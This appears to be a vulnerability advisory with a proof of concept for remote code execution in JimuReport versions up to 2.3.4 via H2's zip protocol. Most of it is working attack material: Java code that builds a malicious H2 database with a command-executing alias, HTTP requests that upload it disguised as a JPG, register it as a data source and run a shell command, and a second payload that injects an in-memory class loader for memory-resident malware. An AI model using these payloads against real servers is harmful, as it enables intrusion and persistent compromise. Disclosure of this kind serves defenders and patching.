# jimureport H2 RCE via Zip Protocol

**Product**: jimureport

**Affected Versions**: ≤ v2.3.4

**address**: https://github.com/jeecgboot/jimureport

## Vulnerability Description

The vulnerability stems from H2database's support for decompressing and parsing .mv.db files via the zip protocol, without restricting the file extension, as long as the file content is in zip format.

**How the H2 zip Protocol Works**

When the H2 driver sees the `zip:` prefix, it performs the following actions:

1. Unzips and opens the specified `.zip` file.

2. Locates a file named `databaseName.mv.db` in the root directory of the compressed file.

3. Loads the database in read-only mode.

In JimuReport versions 2.3.4 and earlier, H2 data sources can parse zip protocols to load malicious DB files, which leads to remote code execution.

## POC

First, generate the db file locally.

h2database dependency

```xml
      <dependency>
          <groupId>com.h2database</groupId>
          <artifactId>h2</artifactId>
          <version>1.4.197</version>
      </dependency>
```

Code to generate db file（jdk1.8）

```java
public static void main(String[] args) throws Exception {
        genh2db();
    }
    public static void genh2db() throws Exception{
        String url = "jdbc:h2:./test";
        Connection conn = DriverManager.getConnection(url, "sa", "");
        Statement stmt = conn.createStatement();

        String payload = "CREATE ALIAS IF NOT EXISTS INVOKE AS '" +
                "String java_exec(String cmd) throws Exception { " +
                "Runtime.getRuntime().exec(cmd); return \"done\"; }'";

        stmt.execute(payload);

        stmt.close();
        conn.close();
        System.out.println("test.mv.db has been generated");
    }
```

Then compress the test.mv.db file and change the zip extension to .jpg.

The /jmreport/upload API can upload JPG files, but it does not check the file header.

```http
POST /jmreport/upload HTTP/1.1
Host: 192.168.239.138:8085
Content-Length: 10346
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
X-Access-Token: 226853cd-d0a4-4684-bb88-c50611cfbd91
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarys1rEBGgex5zX6CI5
Accept: */*
Origin: http://192.168.239.138:8085
Referer: http://192.168.239.138:8085/drag/list
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=22C861AF55521C09D476CCA648FFCBA4; Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1780553750,1780623151; HMACCOUNT=93D1934483419A2C; Hm_lvt_c37f4573e086c82c1c0cc22e1b9d38a1=1780563638,1780624389; Hm_lpvt_c37f4573e086c82c1c0cc22e1b9d38a1=1780624519; X-Access-Token=10d046c8-c791-46ad-abcb-0f31393c1c0c; Hm_lpvt_5819d05c0869771ff6e6a81cdec5b2e8=1780628112
Connection: keep-alive

------WebKitFormBoundarys1rEBGgex5zX6CI5
Content-Disposition: form-data; name="file"; filename="test.mv.jpg"
Content-Type: image/jpeg

xxx
------WebKitFormBoundarys1rEBGgex5zX6CI5--
```

The returned body is as follows, with a relative path `jimureport/test.mv_1780629810324.mv.jpg`. Since the default upload path for Jimu Reports is /opt/upload, concatenating these paths results in the absolute path `/opt/upload/jimureport/test.mv_1780629810324.mv.jpg`.

```json
{"success":true,"message":"jimureport/test.mv_1780629810324.mv.jpg","code":0,"result":null,"timestamp":1780629810324}
```

Add data source

```http
POST /jmreport/addDataSource HTTP/1.1
Host: 192.168.239.138:8085
Content-Length: 221
tenantId: null
X-TIMESTAMP: 1780634135018
X-Access-Token: 10d046c8-c791-46ad-abcb-0f31393c1c0c
X-Sign: D5F8DEBAB465D53C5F21470AB4299011
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json;charset=UTF-8
X-Tenant-Id: null
token: 10d046c8-c791-46ad-abcb-0f31393c1c0c
JmReport-Tenant-Id: null
Origin: http://192.168.239.138:8085
Referer: http://192.168.239.138:8085/doLogin?username=admin&password=123456
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

{"id":"1222063017207087104","reportId":"","code":"","name":"test","dbType":"H2","dbDriver":"org.h2.Driver","dbUrl":"jdbc:h2:zip:/opt/upload/jimureport/test.mv_1780629810324.mv.jpg!/test","dbUsername":"sa","dbPassword":""}
```

Executing the SQL statement `select INVOKE('touch /tmp/pwn')` will enable Remote Code Execution (RCE).

```http
POST /jmreport/queryFieldBySql HTTP/1.1
Host: 192.168.239.138:8085
Content-Length: 85
tenantId: null
X-TIMESTAMP: 1780634137291
X-Access-Token: 10d046c8-c791-46ad-abcb-0f31393c1c0c
X-Sign: 9957087B59B69D695F897F28FA2B3037
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json;charset=UTF-8
X-Tenant-Id: null
token: 10d046c8-c791-46ad-abcb-0f31393c1c0c
JmReport-Tenant-Id: null
Origin: http://192.168.239.138:8085
Referer: http://192.168.239.138:8085/doLogin?username=admin&password=123456
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

{"sql":"select INVOKE('touch /tmp/pwn')","dbSource":"1222063017207087104","type":"0"}
```

It also supports memory injection malware; the code for generating the db file is as follows.（jdk17）

```java
    public static void genh2db() throws Exception {
        String url = "jdbc:h2:./test";
        try (Connection conn = DriverManager.getConnection(url, "sa", "");
             Statement stmt = conn.createStatement()) {

            String payload = "CREATE ALIAS IF NOT EXISTS AQWSSSAZ AS $$\n" +
                    "String execPayload(String cmd) {\n" +
                    "    try {\n" +
                    "        String b64 = \"yv66...\";\n" +
                    "        byte[] code = java.util.Base64.getDecoder().decode(b64);\n" +
                    "        Class<?> unsafeClass = Class.forName(\"sun.misc.Unsafe\");\n" +
                    "        java.lang.reflect.Field f = unsafeClass.getDeclaredField(\"theUnsafe\");\n" +
                    "        f.setAccessible(true);\n" +
                    "        Object unsafe = f.get(null);\n" +
                    "        java.lang.reflect.Method objectFieldOffset = unsafeClass.getDeclaredMethod(\"objectFieldOffset\", java.lang.reflect.Field.class);\n" +
                    "        java.lang.reflect.Method getAndSetObject = unsafeClass.getDeclaredMethod(\"getAndSetObject\", Object.class, long.class, Object.class);\n" +
                    "        String currentClassName = Thread.currentThread().getStackTrace()[1].getClassName();\n" +
                    "        Class<?> self = Class.forName(currentClassName);\n" +
                    "        java.lang.reflect.Field moduleField = Class.class.getDeclaredField(\"module\");\n" +
                    "        long offset = (long) objectFieldOffset.invoke(unsafe, moduleField);\n" +
                    "        Object javaBaseModule = Object.class.getModule();\n" +
                    "        getAndSetObject.invoke(unsafe, self, offset, javaBaseModule);\n" +
                    "        java.lang.reflect.Method defineClass = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
                    "        defineClass.setAccessible(true);\n" +
                    "        Class<?> loaded = (Class<?>) defineClass.invoke(Thread.currentThread().getContextClassLoader(), code, 0, code.length);\n" +
                    "        loaded.getDeclaredConstructor().newInstance();\n" +
                    "        return \"Success\";\n" +
                    "    } catch (Throwable t) {\n" +
                    "        return \"Error: \" + t.toString();\n" +
                    "    }\n" +
                    "}\n$$";
            stmt.execute(payload);
            System.out.println("test.mv.db has been generated");
        }
    }
```